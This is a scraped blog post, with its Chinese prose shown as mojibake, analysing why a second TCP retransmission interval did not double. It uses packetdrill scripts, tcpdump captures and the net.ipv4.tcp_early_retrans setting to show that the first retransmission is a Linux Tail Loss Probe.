                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>çœ‹å›¾çŒœæ•…éšœç³»åˆ—ï¼Œæ¥è‡ªäºæŠ€æœ¯ç¾¤è®¨è®ºçš„åˆä¸€ä¸ªé—®é¢˜ï¼Œæ•°æ®åŒ…å¦‚ä¸‹å›¾ï¼ŒNo.4900 åŸå§‹æ•°æ®åŒ…ï¼ŒNo.4901 é—´éš”208msç¬¬ä¸€æ¬¡é‡ä¼ ï¼ŒNo.4903 é—´éš”208msç¬¬äºŒæ¬¡é‡ä¼ ã€‚</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aecb2aafa0d84c0faf743008b4fbfaa0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgN0FDRQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767940681&amp;x-signature=2NG%2Fiu4ZxywZHPStU7GDT3bFzZE%3D" alt="" loading="lazy"/></p>
<p><strong>é—®é¢˜å°±æ˜¯æ•°æ®åŒ…ç¬¬äºŒæ¬¡è¶…æ—¶é‡ä¼ ï¼Œé—´éš”æ—¶é—´ä¸ºä»€ä¹ˆæ²¡æœ‰ç¿»å€ã€‚</strong></p>
<h2 data-id="heading-1">é—®é¢˜åˆ†æ</h2>
<p>è¯´å®è¯ï¼Œåˆšçœ‹åˆ°è¿™ä¸ªæ•°æ®åŒ…æ–‡ä»¶æˆªå›¾æ—¶ï¼Œè®°å¿†ä¸­ç«Ÿç„¶æ²¡æœ‰ä¸€ä¸ç›¸ä¼¼çš„æ•…éšœç°è±¡ï¼Œç•¥æ„Ÿçº³é—·ã€‚å®é™…è§£è¯»ï¼Œä¹Ÿæ²¡æœ‰ç‰¹åˆ«åå¸¸çš„è¿¹è±¡ï¼Œåªæ˜¯åœ¨é—´éš” 384s åï¼Œå®¢æˆ·ç«¯æ‰€å‘é€çš„æ•°æ®æ®µç”±äºå¾—ä¸åˆ° ACK ç¡®è®¤ï¼Œè¿›è¡Œäº†é‡ä¼ çš„è¿‡ç¨‹ã€‚å½“ç„¶ç”±äºç¬¬äºŒæ¬¡é‡ä¼ çš„è¶…æ—¶æ—¶é—´æœªç¿»å€çš„åŸå› ï¼Œæ‰€ä»¥é¦–å…ˆæˆ‘å¹¶æ²¡æœ‰æŠŠè¿™äº›é‡ä¼ å…¨éƒ¨å®šä¹‰ä¸ºæ˜¯è¶…æ—¶é‡ä¼ ã€‚</p>
<p>ä½†æ—¢ç„¶æ˜¯ä¸€ä¸ªæ•°æ®æ®µçš„é‡ä¼ ï¼Œæ²¡æœ‰å…¶ä»–è¾“å…¥çš„ä¿¡æ¯ï¼Œé‚£ä¹ˆå¯ä»¥å…ˆç®€å•æ¨¡æ‹Ÿè¶…æ—¶é‡ä¼ ï¼Œå¯¹æ¯”çœ‹ä¸‹ã€‚</p>
<pre><code class="hljs language-plain" lang="plain"># cat test.pkt 
0  socket(..., SOCK_STREAM, IPPROTO_TCP) = 3
+0 setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
+0 setsockopt(3, SOL_TCP, TCP_NODELAY, [1], 4) = 0
+0 bind(3, ..., ...) = 0
+0 listen(3, 1) = 0

+0 &lt; S 0:0(0) win 10000 &lt;mss 1000&gt;
+0 &gt; S. 0:0(0) ack 1 &lt;...&gt;
+0.01 &lt; . 1:1(0) ack 1 win 10000
+0 accept(3, ..., ...) = 4

+0.1 write(4,...,100) = 100

+0 `sleep 5`
#
</code></pre>
<p>æ‰§è¡Œè„šæœ¬ï¼ŒåŒæ—¶é€šè¿‡ tcpdump æŠ“å–æ•°æ®åŒ…ï¼Œç°è±¡å¦‚ä¸‹ã€‚</p>
<p>å¯ä»¥çœ‹åˆ°å‘å‡ºæ•°æ®æ®µåï¼Œç¬¬ä¸€æ¬¡é‡ä¼ é—´éš”æ—¶é—´ä¸º213msï¼Œè€Œç¬¬äºŒæ¬¡é‡ä¼ é—´éš”æ—¶é—´ä¸º436msï¼Œä¹Ÿå°±æ˜¯è¯´éƒ½ç¬¦åˆè¶…æ—¶é‡ä¼ çš„ç°è±¡ï¼Œè¶…æ—¶æ—¶é—´æ˜¯æ­£å¸¸ç¿»å€äº†ã€‚</p>
<pre><code class="hljs language-plain" lang="plain"># packetdrill test.pkt
#


# tcpdump -i any -nn port 8080
tcpdump: data link type LINUX_SLL2
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
22:25:38.983501 tun0  In  IP 192.0.2.1.34827 &gt; 192.168.209.238.8080: Flags [S], seq 0, win 10000, options [mss 1000], length 0
22:25:38.983536 tun0  Out IP 192.168.209.238.8080 &gt; 192.0.2.1.34827: Flags [S.], seq 3745491915, ack 1, win 64240, options [mss 1460], length 0
22:25:38.993637 tun0  In  IP 192.0.2.1.34827 &gt; 192.168.209.238.8080: Flags [.], ack 1, win 10000, length 0
22:25:39.093744 tun0  Out IP 192.168.209.238.8080 &gt; 192.0.2.1.34827: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
22:25:39.307178 tun0  Out IP 192.168.209.238.8080 &gt; 192.0.2.1.34827: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
22:25:39.743184 tun0  Out IP 192.168.209.238.8080 &gt; 192.0.2.1.34827: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
22:25:40.607187 tun0  Out IP 192.168.209.238.8080 &gt; 192.0.2.1.34827: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
22:25:42.335186 tun0  Out IP 192.168.209.238.8080 &gt; 192.0.2.1.34827: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
#
</code></pre>
<p>å½“ç„¶ï¼Œç”±äºç¬¬ä¸€ä¸ªæµ‹è¯•å¹¶æ²¡æœ‰æ”¯æŒ SACKï¼Œå› æ­¤ç»§ç»­å¯ä»¥å¢åŠ å°è¯•æµ‹è¯•ã€‚</p>
<pre><code class="hljs language-plain" lang="plain"># cat test.pkt 
0  socket(..., SOCK_STREAM, IPPROTO_TCP) = 3
+0 setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
+0 setsockopt(3, SOL_TCP, TCP_NODELAY, [1], 4) = 0
+0 bind(3, ..., ...) = 0
+0 listen(3, 1) = 0

+0 &lt; S 0:0(0) win 10000 &lt;mss 1000,nop,nop,sackOK&gt;
+0 &gt; S. 0:0(0) ack 1 &lt;...&gt;
+0.01 &lt; . 1:1(0) ack 1 win 10000
+0 accept(3, ..., ...) = 4

+0.1 write(4,...,100) = 100

+0 `sleep 5`
#
</code></pre>
<p>æ‰§è¡Œè„šæœ¬ï¼ŒåŒæ—¶é€šè¿‡ tcpdump æŠ“å–æ•°æ®åŒ…ï¼Œç°è±¡å¦‚ä¸‹ã€‚</p>
<p>å¯ä»¥çœ‹åˆ°å‘å‡ºæ•°æ®æ®µåï¼Œç¬¬ä¸€æ¬¡é‡ä¼ é—´éš”æ—¶é—´ä¸º213msï¼Œè€Œç¬¬äºŒæ¬¡é‡ä¼ é—´éš”æ—¶é—´ä¸º216msï¼Œå’Œé—®é¢˜æˆªå›¾ä¸€æ¨¡ä¸€æ ·çš„ç°è±¡ï¼Œç¬¬äºŒæ¬¡é‡ä¼ çš„è¶…æ—¶æ—¶é—´å¹¶æœªç¿»å€ã€‚</p>
<pre><code class="hljs language-plain" lang="plain"># packetdrill test.pkt
#


# tcpdump -i any -nn port 8080
tcpdump: data link type LINUX_SLL2
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
22:35:37.983481 tun0  In  IP 192.0.2.1.54829 &gt; 192.168.44.251.8080: Flags [S], seq 0, win 10000, options [mss 1000,nop,nop,sackOK], length 0
22:35:37.983508 tun0  Out IP 192.168.44.251.8080 &gt; 192.0.2.1.54829: Flags [S.], seq 2010255923, ack 1, win 64240, options [mss 1460,nop,nop,sackOK], length 0
22:35:37.993598 tun0  In  IP 192.0.2.1.54829 &gt; 192.168.44.251.8080: Flags [.], ack 1, win 10000, length 0
22:35:38.093722 tun0  Out IP 192.168.44.251.8080 &gt; 192.0.2.1.54829: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
22:35:38.307185 tun0  Out IP 192.168.44.251.8080 &gt; 192.0.2.1.54829: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
22:35:38.523213 tun0  Out IP 192.168.44.251.8080 &gt; 192.0.2.1.54829: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
22:35:38.975187 tun0  Out IP 192.168.44.251.8080 &gt; 192.0.2.1.54829: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
22:35:39.839188 tun0  Out IP 192.168.44.251.8080 &gt; 192.0.2.1.54829: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
22:35:41.567190 tun0  Out IP 192.168.44.251.8080 &gt; 192.0.2.1.54829: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
#
</code></pre>
<p>é€šè¿‡ä¸¤æ¬¡å®éªŒå¯¹æ¯”ï¼Œå¯çŸ¥ä»…ä»…æ˜¯å¢åŠ äº† SACK çš„æ”¯æŒï¼Œå°±äº§ç”Ÿäº†ä¸ä¸€æ ·çš„ç»“æœï¼ŒåŒæ—¶ç»“åˆæ•°æ®åŒ…çš„é‡ä¼ æ—¶é—´ï¼Œå¯ä»¥åˆ¤æ–­å‡ºç¬¬ä¸€æ¬¡é‡ä¼ å¹¶ä¸æ˜¯æ™®é€šçš„è¶…æ—¶é‡ä¼ ï¼Œè€Œåœ¨å®ƒå‘å‡ºä¹‹åï¼Œçœ‹åˆ°çš„ç¬¬äºŒæ¬¡é‡ä¼ ï¼Œæ‰æ˜¯çœŸæ­£çš„ç¬¬ä¸€æ¬¡è¶…æ—¶é‡ä¼ ï¼Œä¹‹åçš„ä¹Ÿæ‰æ˜¯ RTO ä¸æ–­ç¿»å€åçš„è¶…æ—¶é‡ä¼ è¿‡ç¨‹ã€‚</p>
<p>é‚£ä¹ˆç¬¬ä¸€æ¬¡é‡ä¼ æ˜¯ä»€ä¹ˆï¼Ÿ<strong>åœ¨ linux ç³»ç»Ÿä¸­ï¼Œå®ƒå®é™…æ˜¯ä¸€ä¸ª TLP æ•°æ®åŒ…ï¼Œåœ¨SACKå¼€å¯ä¸‹ï¼ŒTLP ä¼šé‡ä¼ å¼ºåˆ¶ä¼ è¾“è¿˜æ²¡æœ‰æ”¶åˆ° ACK ç¡®è®¤çš„æŠ¥æ–‡é‡Œé¢çš„æœ€åä¸€ä¸ªæŠ¥æ–‡æˆ–è€…æœªå‘é€çš„æ–°æŠ¥æ–‡ã€‚</strong> è€Œåœ¨ä¸Šé¢çš„æµ‹è¯•ä»¥åŠé—®é¢˜æˆªå›¾åœºæ™¯ä¸­ï¼Œä¹Ÿæ¯”è¾ƒç‰¹æ®Šï¼Œå› ä¸ºåªå‘é€äº†ä¸€ä¸ªæŠ¥æ–‡ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡é‡ä¼ ä¹Ÿå°±æ˜¯å‘é€äº† TLP å®šä¹‰ä¸­çš„æœ€åä¸€ä¸ªæŠ¥æ–‡ï¼Œä¹çœ‹èµ·æ¥ï¼Œç¡®å®åƒæ˜¯åœ¨è¿›è¡Œè¶…æ—¶é‡ä¼ ã€‚</p>
<h2 data-id="heading-2">TLP ä»‹ç»</h2>
<p>Tail Loss Probe (TLP)æ˜¯ä¸€ä¸ªå‘é€ç«¯ç®—æ³•ï¼Œä¸»è¦ç›®çš„æ˜¯ä½¿ç”¨å¿«é€Ÿé‡ä¼ å–ä»£RTOè¶…æ—¶é‡ä¼ æ¥å¤„ç†å°¾åŒ…ä¸¢å¤±åœºæ™¯ã€‚å¦‚æœTCPå°¾åŒ…ä¸¢å¤±ï¼Œå¦‚æœä¾é RTOè¶…æ—¶è¿›è¡Œé‡ä¼ ä¼šå¸¦æ¥æ¯”è¾ƒå¤§çš„å»¶è¿Ÿï¼Œè¿›è€Œå½±å“ç”¨æˆ·ä½“éªŒã€‚</p>
<p>é‚£ä¹ˆå¦‚æœä¸€ä¸ªTCPè¿æ¥æ²¡æœ‰åœ¨ä¸€æ®µæ—¶é—´å†…æ²¡æœ‰æ”¶åˆ°ACKæŠ¥æ–‡ï¼ŒTLPä¼šå¼ºåˆ¶ä¼ è¾“è¿˜æ²¡æœ‰æ”¶åˆ°ACKç¡®è®¤çš„æŠ¥æ–‡é‡Œé¢çš„æœ€åä¸€ä¸ªæŠ¥æ–‡æˆ–è€…æœªå‘é€çš„æ–°æŠ¥æ–‡(ä¼ è¾“çš„è¿™ä¸ªæŠ¥æ–‡å°±å«åšloss probe)ã€‚</p>
<p><strong>tcp_early_retrans - INTEGER</strong></p>
<p>Enable Early Retransmit (ER), per RFC 5827. ER lowers the threshold for triggering fast retransmit when the amount of outstanding data is small and when no previously unsent data can be transmitted (such that limited transmit could be used). Also controls the use of Tail loss probe (TLP) that converts RTOs occurring due to tail losses into fast recovery (draft-dukkipati-tcpm-tcp-loss-probe-01).</p>
<p>Possible values:</p>
<p>0 disables ER</p>
<p>1 enables ER</p>
<p>2 enables ER but delays fast recovery and fast retransmit by a fourth of RTT. This mitigates connection falsely recovers when network has a small degree of reordering (less than 3 packets).</p>
<p>3 enables delayed ER and TLP.</p>
<p>4 enables TLP only.</p>
<p>Default: 3</p>
<h2 data-id="heading-3">è¯æ˜å®éªŒ</h2>
<p>åœ¨ linux ä¸­ <strong>tcp_early_retrans</strong> å‚æ•°é»˜è®¤å€¼ä¸º 3ï¼Œä¹Ÿå°±æ˜¯åŒæ—¶å¯ç”¨äº† Delayed ER å’Œ TLPã€‚</p>
<pre><code class="hljs language-plain" lang="plain"># sysctl -a|grep early_retrans
net.ipv4.tcp_early_retrans = 3
# 
</code></pre>
<p>å¦‚æœæƒ³è¯æ˜ç¡®å®å’Œ TLP ç›¸å…³ï¼Œå¯ä»¥ä»ä¸‰ä¸ªæ–¹é¢æµ‹è¯•ä¸‹ï¼š</p>
<ol>
<li>å…³é—­ SACKï¼›ï¼ˆä¸Šè¿°å®éªŒå·²æµ‹è¯•ï¼‰</li>
<li>net.ipv4.tcp_early_retrans å€¼ä¿®æ”¹ä¸º 4ï¼Œä»…å¼€å¯ TLPï¼›</li>
<li>net.ipv4.tcp_early_retrans å€¼ä¿®æ”¹ä¸º 0ï¼Œå…³é—­ ER ä»¥åŠ TLPã€‚</li>
</ol>
<p>é¦–å…ˆä»…å¼€å¯ TLP çš„æƒ…å†µï¼Œç»§ç»­æµ‹è¯•åœ¨ SACK å¼€å¯çš„è„šæœ¬ã€‚</p>
<pre><code class="hljs language-plain" lang="plain"># sysctl -q net.ipv4.tcp_early_retrans=4
# sysctl -a|grep early_retrans
net.ipv4.tcp_early_retrans = 4
# 
</code></pre>
<p>æ‰§è¡Œè„šæœ¬ï¼ŒåŒæ—¶é€šè¿‡ tcpdump æŠ“å–æ•°æ®åŒ…ï¼Œç°è±¡å¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°ä¸é»˜è®¤å€¼ 3 çš„æµ‹è¯•ç»“æœä¸€è‡´ï¼Œè¯´æ˜äº†å’Œ ER é‡ä¼ æ— å…³ï¼Œä¸ TLP å¯èƒ½æœ‰å…³ï¼ˆä¸¥è°¨çš„è¯´æ³•ï¼Œå› ä¸ºä¹Ÿæœ‰å¯èƒ½æ˜¯æŸæŸé‡ä¼ å¼•èµ·ï¼‰ã€‚</p>
<pre><code class="hljs language-plain" lang="plain"># tcpdump -i any -nn port 8080
tcpdump: data link type LINUX_SLL2
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
10:12:36.563494 tun0  In  IP 192.0.2.1.50647 &gt; 192.168.165.47.8080: Flags [S], seq 0, win 10000, options [mss 1000,nop,nop,sackOK], length 0
10:12:36.563526 tun0  Out IP 192.168.165.47.8080 &gt; 192.0.2.1.50647: Flags [S.], seq 3170095082, ack 1, win 64240, options [mss 1460,nop,nop,sackOK], length 0
10:12:36.573627 tun0  In  IP 192.0.2.1.50647 &gt; 192.168.165.47.8080: Flags [.], ack 1, win 10000, length 0
10:12:36.673761 tun0  Out IP 192.168.165.47.8080 &gt; 192.0.2.1.50647: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
10:12:36.887178 tun0  Out IP 192.168.165.47.8080 &gt; 192.0.2.1.50647: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
10:12:37.103192 tun0  Out IP 192.168.165.47.8080 &gt; 192.0.2.1.50647: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
10:12:37.535174 tun0  Out IP 192.168.165.47.8080 &gt; 192.0.2.1.50647: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
10:12:38.399184 tun0  Out IP 192.168.165.47.8080 &gt; 192.0.2.1.50647: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
10:12:40.127180 tun0  Out IP 192.168.165.47.8080 &gt; 192.0.2.1.50647: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
#
</code></pre>
<p>ç»§ç»­å…³é—­ TLP çš„æƒ…å†µï¼Œä»ç„¶æ˜¯æµ‹è¯• SACK å¼€å¯çš„è„šæœ¬ã€‚</p>
<pre><code class="hljs language-plain" lang="plain"># sysctl -q net.ipv4.tcp_early_retrans=0
# sysctl -a|grep early_retrans
net.ipv4.tcp_early_retrans = 0
# 
</code></pre>
<p>æ‰§è¡Œè„šæœ¬ï¼ŒåŒæ—¶é€šè¿‡ tcpdump æŠ“å–æ•°æ®åŒ…ï¼Œç°è±¡å¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°ä¸å…³é—­ SACK çš„é¦–æ¬¡æµ‹è¯•ç»“æœä¸€è‡´ï¼Œæ ‡å‡†çš„è¶…æ—¶é‡ä¼ ç°è±¡ã€‚å¯¹äºå…³é—­ TLP å’Œå¼€å¯ TLP çš„ä¸¤æ¬¡å®éªŒç»“æœï¼Œå¯å¾—çŸ¥ç¬¬ä¸€æ¬¡é‡ä¼ æ•°æ®åŒ…ç¡®å®æ˜¯ TLP æŠ¥æ–‡ã€‚</p>
<pre><code class="hljs language-plain" lang="plain"># tcpdump -i any -nn port 8080
tcpdump: data link type LINUX_SLL2
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
10:17:24.423493 tun0  In  IP 192.0.2.1.35821 &gt; 192.168.117.180.8080: Flags [S], seq 0, win 10000, options [mss 1000,nop,nop,sackOK], length 0
10:17:24.423527 tun0  Out IP 192.168.117.180.8080 &gt; 192.0.2.1.35821: Flags [S.], seq 1548070828, ack 1, win 64240, options [mss 1460,nop,nop,sackOK], length 0
10:17:24.433632 tun0  In  IP 192.0.2.1.35821 &gt; 192.168.117.180.8080: Flags [.], ack 1, win 10000, length 0
10:17:24.533759 tun0  Out IP 192.168.117.180.8080 &gt; 192.0.2.1.35821: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
10:17:24.751193 tun0  Out IP 192.168.117.180.8080 &gt; 192.0.2.1.35821: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
10:17:25.183189 tun0  Out IP 192.168.117.180.8080 &gt; 192.0.2.1.35821: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
10:17:26.047181 tun0  Out IP 192.168.117.180.8080 &gt; 192.0.2.1.35821: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
10:17:27.775172 tun0  Out IP 192.168.117.180.8080 &gt; 192.0.2.1.35821: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
#
</code></pre>
<h2 data-id="heading-4">é—®é¢˜æ€»ç»“</h2>
<p>å®é™…ä¸Šå¯¹äºé‡ä¼ è§¦å‘å‡ºæ¥çš„åŸå› ï¼Œæˆ–è€…è¯´é‡ä¼ çš„å½’ç±»ï¼Œè¿œè¿œä¸æ­¢ä¼—æ‰€å‘¨çŸ¥çš„è¶…æ—¶é‡ä¼ ã€å¿«é€Ÿé‡ä¼ è¿™ä¸¤ç§ï¼Œåç»­å†æ…¢æ…¢å±•å¼€åˆ†äº«å§ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>